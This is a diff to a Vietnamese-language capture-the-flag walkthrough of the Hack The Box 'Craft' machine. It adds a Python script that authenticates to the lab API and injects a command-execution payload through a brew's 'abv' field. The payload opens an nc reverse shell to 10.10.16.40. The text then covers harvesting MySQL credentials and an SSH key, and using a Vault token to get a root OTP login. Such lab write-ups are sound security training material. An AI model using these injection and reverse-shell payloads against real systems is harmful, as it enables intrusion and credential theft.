@@ -106,32 +106,51 @@ Dưới đây là tôi tạo thử `brew` mới:
 Cải tiến lại file `test.py` bằng cách thêm payload vào:
 
 ```
+import requests
+import json
+import urllib3
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh','4aUh0A8PbVJxgd'), verify=False)
+json_response = json.loads(response.text)
+token = json_response['token']
+headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' }
+response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
+print(response.text)
+print("Create bogus ABV brew")
+brew_dict = {}
+brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.40 1234 >/tmp/f')"
+brew_dict['name'] = 'bullshit'
+brew_dict['brewer'] = 'bullshit'
+brew_dict['style'] = 'bullshit'
+json_data = json.dumps(brew_dict)
+response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
+print(response.text)
 ```
 
+Bật nc lên và chạy file test.py là đã có reverse shell, tôi lấy được cả username và password của mysql:
 
+<img width="1905" height="973" alt="image" src="https://github.com/user-attachments/assets/973724fd-8634-4642-b7ad-50ad2f4f9f27" />
 
+Nhưng lại không chạy được lệnh `mysql`, tôi dùng python kết nối đến thay vì chạy mysql:
 
+<img width="1883" height="560" alt="image" src="https://github.com/user-attachments/assets/76726ea9-5382-40d9-af55-7fbec27e2f6f" />
 
+Ở bảng `user` thì có 3 user, đối với user dinesh và gilfoyle thì tôi có thể đăng nhập vào được `gogs.craft.htb`, đối với user gilfoyle thì tôi thấy có repo `craft-infra` và có chứa `.ssh` ở đó:
 
+<img width="936" height="964" alt="image" src="https://github.com/user-attachments/assets/f19cc84b-b305-49dd-a312-bfb4ae68e231" />
 
+Ở đây đòi thêm cả passphrase, tôi điền bừa `ZEU3N8WNM2rh4T` vào thì được:
 
+<img width="795" height="605" alt="image" src="https://github.com/user-attachments/assets/ad180ee1-63fc-4f05-9f4b-a45fdd4f5083" />
 
+<img width="852" height="997" alt="image" src="https://github.com/user-attachments/assets/771d833b-95e9-48a4-aaab-a209ad842655" />
 
+Ở đây thì tôi lại để ý đến `.vault-token`, tôi tra mạng và tìm cách sử dụng:
 
+<img width="1875" height="1002" alt="image" src="https://github.com/user-attachments/assets/3bd727a8-1d22-4268-a3db-3d69654b29b8" />
 
-
-
-
-
-
-
-
-
-
-
-
-
+Tôi dùng `vault secrets list` để liệt kê các mục, dùng `vault read ssh/roles/root_otp ` để đọc cấu hình với user là root và sử dụng otp để xác thực, sau đó là dùng `vault write ssh/creds/root_otp ip=10.129.8.107` để lấy otp là key và cuối cùng là ssh vào với user là root.
 
 
 
